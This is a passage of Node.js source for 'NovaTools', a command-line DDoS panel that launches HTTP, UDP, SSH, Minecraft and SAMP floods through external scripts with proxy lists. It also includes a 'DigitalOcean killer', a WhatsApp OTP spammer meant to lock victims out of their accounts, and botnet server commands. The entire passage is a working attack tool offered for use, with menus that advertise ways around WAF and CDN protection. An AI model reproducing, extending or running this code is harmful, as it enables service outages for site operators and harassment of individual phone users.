        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'quantum') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 4 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
 ∆ Attack Information:
  - Target: ${target}
  - Duration: ${duration} sec
  - Concurrents: 1/1
  
 ∆ Target Detail:
 - ISP: [ ${cyan}${result.isp}${Reset} ]
 - IP: [ ${cyan}${result.query}${Reset} ]
 - AS: [ ${cyan}${result.as}${Reset} ]
 
 Please type \x1b[92mCLS\x1b[0m after attack
───────────────────────────────────────────────────\x1b[0m
Type ${bold}${biru}"cls"${Reset} to clear terminal
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
               OTP Killer Has Been Launched
               Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/Temp.js`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
               VPS Killer Has Been Launched
               Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw.js`);
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
           UDP Raw Flood Attack Launched
           Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};

// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
           Minecraft Flood Attack Launched
           Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : Minecraft Flooder
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}

const metode = path.join(__dirname, `/lib/cache/StarsXMc.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
                SAMP Flood Attack Launched
                Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
                 Subdomains Finder
               Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
nova.question(`${back_putih}${teksmerah}SaaX${Reset}➔ ${back_putih}${teksmerah}Chat AI${Reset}: `, async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat GPT Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/SaaXPloitz/news/refs/heads/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By SaaX

Thx To:
Allah SWT
ChatGPT, Deepseek, Gemini & Meta Ai
PermenMD ( Provide Base Script )
Bayu ( Friend )
`
nova.question(`\x1b[48;5;7m\x1b[38;2;128;128;128mNovaTools\x1b[0m ➤ `, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods      | show list of available methods
| srvmenu      | show server menu
| track-ip     | track ip address with info
| subdo-finder | find all subdomain from domain
| kill-wifi    | kill your wifi (termux/linux/windows only)
| kill-ssh     | kill VPS Access 
| kill-otp     | kill WhatsApp OTP Verification
| kill-ping    | sending death pinger
| samp         | S.A.M.P Flooder
| mc-flood     | Minecraft Bot Flooder
| attack       | launch ddos attack
| udp-raw      | launch udp flood attack
| kill-do      | digital ocean killer
| ongoing      | show ongoing DoS attack
| monitor      | show ongoing DDoS attack
| credits      | show creator of these tools
| cls          | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
\x1b[31m╔═╗╦  ╦╔═╗╦╦  ╔═╗╔╗ ╦  ╔═╗\x1b[0m  \x1b[31m╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗\x1b[0m
\x1b[31m╠═╣╚╗╔╝╠═╣║║  ╠═╣╠╩╗\x1b[0m║  ║╣   ║║║║╣  \x1b[31m║ ╠═╣║ ║ ║║╚═╗\x1b[0m
\x1b[31m╩ ╩ ╚╝ ╩ ╩╩╩═╝╩ ╩\x1b[0m╚═╝╩═╝╚═╝  ╩ ╩╚═╝ ╩ \x1b[31m╩ ╩╚═╝═╩╝╚═╝\x1b[0m

    [ Layer 7 Methods ]
\x1b[38;5;1m•\x1b[0m FLOOD     \x1b[38;5;1m»\x1b[0m Flooding target with massive HTTP requests [Basic]
\x1b[38;5;1m•\x1b[0m HTTPS     \x1b[38;5;1m»\x1b[0m Specialized attack targeting HTTPS protocol [Basic]
\x1b[38;5;1m•\x1b[0m TLS       \x1b[38;5;1m»\x1b[0m Overload server with repeated TLS handshakes [Basic]
\x1b[38;5;1m•\x1b[0m STRIKE    \x1b[38;5;1m»\x1b[0m Advanced bypass for basic protections [Basic]
\x1b[38;5;1m•\x1b[0m STROM     \x1b[38;5;1m»\x1b[0m Double the power of standard flooding [Basic]
\x1b[38;5;1m•\x1b[0m BYPASS    \x1b[38;5;1m»\x1b[0m Bypass advanced protections like WAF or CDN [VIP]
\x1b[38;5;1m•\x1b[0m THUNDER   \x1b[38;5;1m»\x1b[0m Special method combining multiple attack techniques [VIP]
\x1b[38;5;1m•\x1b[0m PIDORAS   \x1b[38;5;1m»\x1b[0m Exploits specific vulnerabilities for maximum impact [VIP]
\x1b[38;5;1m•\x1b[0m RAPE      \x1b[38;5;1m»\x1b[0m Focuses on HTTP/1 protocol for intense flooding [VIP]

    [ Layer 4 Methods ]
\x1b[38;5;1m•\x1b[0m KILL-SSH  \x1b[38;5;1m»\x1b[0m Targets SSH services with connection flooding [Basic]
\x1b[38;5;1m•\x1b[0m KILL-DO   \x1b[38;5;1m»\x1b[0m Specifically designed to disrupt Digital Ocean servers [Basic]
\x1b[38;5;1m•\x1b[0m UDP-RAW   \x1b[38;5;1m»\x1b[0m Floods target with raw UDP packets [VIP]
\x1b[38;5;1m•\x1b[0m KILL-PING \x1b[38;5;1m»\x1b[0m Sends oversized ping packets to crash the target [VIP]
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
Ex: attack [URL] [TIME] [METHODS] \x1b[38;5;1m»\x1b[0m attack https://url.com 120 flood
`);
    sigma();
      } else if (command === 'srvmenu') {
    console.log(`
[=========================================]
|| srvattack  || Attack with Server      ||
|| testsrv    || Checking Your Server    ||
|| addsrv     || Add Server              ||
[=========================================]

    [ Methods ]
 \x1b[38;5;1m•\x1b[0m HTTPS     \x1b[38;5;1m»\x1b[0m Special Method [VIP]
 \x1b[38;5;1m•\x1b[0m STRIKE    \x1b[38;5;1m»\x1b[0m BypassV2 [Basic]
 \x1b[38;5;1m•\x1b[0m BYPASS    \x1b[38;5;1m»\x1b[0m Special Bypass [VIP]
 \x1b[38;5;1m•\x1b[0m QUANTUM   \x1b[38;5;1m»\x1b[0m Advanced Flooding [VIP]
 \x1b[38;5;1m•\x1b[0m RAPE      \x1b[38;5;1m»\x1b[0m Http 1 Only [VIP]
 \x1b[38;5;1m•\x1b[0m STORM     \x1b[38;5;1m»\x1b[0m 2x Power [Basic]
 \x1b[38;5;1m•\x1b[0m MIX       \x1b[38;5;1m»\x1b[0m Combined Methods [Basic]
 \x1b[38;5;1m•\x1b[0m RAW       \x1b[38;5;1m»\x1b[0m Raw Flooding [Basic]
 \x1b[38;5;1m•\x1b[0m CIBI      \x1b[38;5;1m»\x1b[0m Custom Flooding [Basic]
 \x1b[38;5;1m•\x1b[0m GLORY     \x1b[38;5;1m»\x1b[0m Ultimate Power [VIP]
 \x1b[38;5;1m•\x1b[0m UAM       \x1b[38;5;1m»\x1b[0m Anti-Captcha [VIP]
 \x1b[38;5;1m•\x1b[0m NINJA     \x1b[38;5;1m»\x1b[0m Stealth Mode [Basic]
 \x1b[38;5;1m•\x1b[0m PIDORAS   \x1b[38;5;1m»\x1b[0m Special Method [VIP]
 \x1b[38;5;1m•\x1b[0m VSEBYPASS \x1b[38;5;1m»\x1b[0m VSE Bypass [VIP]
 \x1b[38;5;1m•\x1b[0m VSEFLOOD  \x1b[38;5;1m»\x1b[0m VSE Flood [VIP]
 \x1b[38;5;1m•\x1b[0m TLS       \x1b[38;5;1m»\x1b[0m TLS Flood [Basic]
 \x1b[38;5;1m•\x1b[0m BROWSER   \x1b[38;5;1m»\x1b[0m Browser Emulation [VIP]

\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
Ex: srvattack [URL] [TIME] [METHODS] \x1b[38;5;1m»\x1b[0m attack https://url.com 120 flood
`);

    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`Chat GPT Started 
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'monitor') {
    monitorOngoingAttacks()
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
    } else if (command === 'addsrv') {
    processBotnetEndpoint(args)
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
  } else if (command === 'srvattack') {
    AttackBotnetEndpoints(args) 
  } else if (command === 'cls') {
    banner()
    sigma()
  } else if (command === 'removeuser') {
      const encryptedData = fs.readFileSync(loginFile, 'utf-8');
      const decryptedData = decrypt(encryptedData);
      if (!decryptedData) {
        console.log("\x1b[31mError: Failed To Decrypt Login Data.\x1b[0m");
        return;
      }

      const data = JSON.parse(decryptedData);
      
  if (data.role !== 'Admin') {
    console.log(`\x1b[31mYou Need Admin Role To Use This Command.\x1b[0m`);
    sigma();
    return;
  }

  if (args.length < 1) {
    console.log(`\x1b[31mUsage: removeuser <username>\x1b[0m`);
    sigma();
    return;
  }

  const [username] = args;
  removeUser(username);
  sigma();
// [========================================] //
  } else if (command === 'adduser') {
      const encryptedData = fs.readFileSync(loginFile, 'utf-8');
      const decryptedData = decrypt(encryptedData);
      if (!decryptedData) {
        console.log("\x1b[31mError: Failed To Decrypt Login Data.\x1b[0m");
        return;
      }

      const data = JSON.parse(decryptedData);
      
      if (data.role !== 'Admin') {
        console.log(`\x1b[31mYou Need Admin Role To Use This Command.\x1b[0m`);
        sigma();
        return;
      }
      if (args.length < 4) {
        console.log(`\x1b[31mUsage: adduser <username> <password> <expired> <role>\x1b[0m`);
        sigma();
        return;
      }
      const [username, password, expired, role] = args;
      addUser(username, password, expired, role);
    sigma()
  } else {
    console.log(` ${command} Not Found `);
    sigma();
  }
});
}

// [========================================] //
try {
  bootup();
} catch (error) {
  console.error('Error:', error);
  process.exit(1);
}
